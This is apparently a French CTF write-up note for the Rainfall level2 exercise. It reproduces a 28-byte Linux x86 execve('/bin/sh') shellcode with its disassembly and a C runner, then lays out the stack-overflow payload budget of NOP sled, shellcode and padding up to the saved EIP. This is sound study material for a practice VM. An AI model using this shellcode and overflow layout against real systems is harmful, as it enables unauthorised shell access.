# Shellcode (level2)

## Référence principale — Linux/x86 `execve("/bin/sh")` (28 octets)

**Source :** [Shell-Storm — shellcode-811](https://shell-storm.org/shellcode/files/shellcode-811.html)  
**Auteur :** Jean Pascal Pereira \<pereira@secbiz.de\> — Web : http://0xffe4.org  

```c
/*
Title:	Linux x86 execve("/bin/sh") - 28 bytes
Author:	Jean Pascal Pereira <pereira@secbiz.de>
Web:	http://0xffe4.org


Disassembly of section .text:

08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80



*/

#include <stdio.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";

int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}
```

### Pourquoi **28 octets** ?

Ce n’est **pas** une contrainte du sujet Rainfall : c’est la **taille réelle** de cette séquence machine, une fois assemblée.

- Chaque instruction x86 a un **encodage de longueur fixe** (1 à 5 octets selon l’opcode et les opérandes).
- Le stub fait : `xor eax,eax` → `push` chaîne `//sh` puis `/bin` sur la pile → `mov` vers `ebx` (argv0), `ecx`/`edx` (NULL) → `al = 11` → **`int 0x80`** (`execve`) → puis `xor eax` / `inc eax` / **`int 0x80`** (`exit(1)` propre).
- En additionnant les octets du désassemblage ci‑dessus : **2+1+5+5+2+2+2+2+2+2+1+2 = 28** octets.

Le level2 impose seulement que **NOP + shellcode + padding = 80** avant le gadget ; **28** est la longueur de **ce** shellcode choisi, pas un nombre magique imposé par le binaire.

```python
# Python 2 sur la VM (même octets que la référence)
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
    "\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
)
```

Pas de `\x00` dans la chaîne machine ci‑dessus (compatible `gets` sans NUL parasite dans le shellcode).

---

## Budget d’octets (level2)

Jusqu’à l’overwrite du **saved EIP**, il n’y a que **80 octets** depuis `buf[0]` :

`NOP×N` + **shellcode** + **padding** (`A`) = **80**

- Avec **NOP = 40** et shellcode **28** → `padding = 80 − 40 − 28 = **12**`.
- Autre variante connue : [buffer-i386-cool](https://github.com/buffer/shellcodes/blob/master/buffer-i386-cool.c) (**30** octets) → `padding = **10**`.

---

## Variante — [buffer-i386-cool.c](https://github.com/buffer/shellcodes/blob/master/buffer-i386-cool.c) (30 octets)

**Auteur :** Angelo Dell'Aera (2002). Même objectif (`execve`), autre enchaînement ; longueur **30** octets → avec NOP×40 → **`A`×10**.

---

## Références

- Shell-Storm (28 bytes) : https://shell-storm.org/shellcode/files/shellcode-811.html  
- `execve(2)` : https://man7.org/linux/man-pages/man2/execve.2.html  
